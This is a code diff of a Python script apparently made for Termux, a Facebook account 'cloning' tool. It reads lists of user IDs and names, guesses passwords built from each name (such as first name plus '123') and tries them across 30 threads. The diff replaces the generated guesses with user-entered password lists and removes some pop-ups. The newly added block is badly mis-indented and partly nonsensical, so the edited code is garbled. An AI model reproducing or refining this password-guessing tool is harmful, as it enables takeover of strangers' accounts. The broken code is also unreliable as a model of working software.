@@ -108,9 +108,7 @@ def logo():
 def reg():
     os.system('termux-setup-storage')
     os.system('clear')
-    os.system('xdg-open https://www.facebook.com/bk4human')
     logo()
-    print ('')
     print ('                     Checking Approval')
     time.sleep(1) 
     try:
@@ -123,7 +121,6 @@ def reg():
         bsn_menu()
     else:
         os.system('clear')
-        os.system('xdg-open https://www.facebook.com/bk4human')
         logo()
         print('')
         print ('               \tApproved Not Detected')
@@ -203,7 +200,7 @@ def bsn_menu():
     IP = ipm["origin"]
     print(" [1] File Cloning")
     print(" [0] Exit")
-    print("")
+    print("__________________________________________________")
     pepek = input(' Select : ')
     if pepek in['1','01']:
         __bsn__().bilo(id)
@@ -230,7 +227,6 @@ class __bsn__:
             logo()
             print("              Method Menu")
             print('__________________________________________________')
-            print('')
             print(' [+] Method 1')
             print(' [+] Method 2')
             print(' [+] Method 3 (Best)')
@@ -384,15 +380,14 @@ class __bsn__:
             with BilalBSN(max_workers=30) as kirim:
                 for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                     try:
-                        uid, name = yntkts.split('|')
-                        xz = name.split(' ')
-                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
-                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
-                        else:
-                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
-                        kirim.submit(self.__api__, uid, pwx)
-                    except:
-                        pass
+           if 'o':     
+           lp = input(f'{oo("?")}Total Password? : ')
+        if lp.isnumeric():
+            ex = 'firstlast first123 last123'
+            print(f'{oo("+")}{ex} (ETC)')
+            for x in range(int(lp)):
+                totalpass.append(input(f'{oo(x+1)}Password : '))
+            pass
 
             hasil(ok,cp)
         elif chi in ('2', '02'):
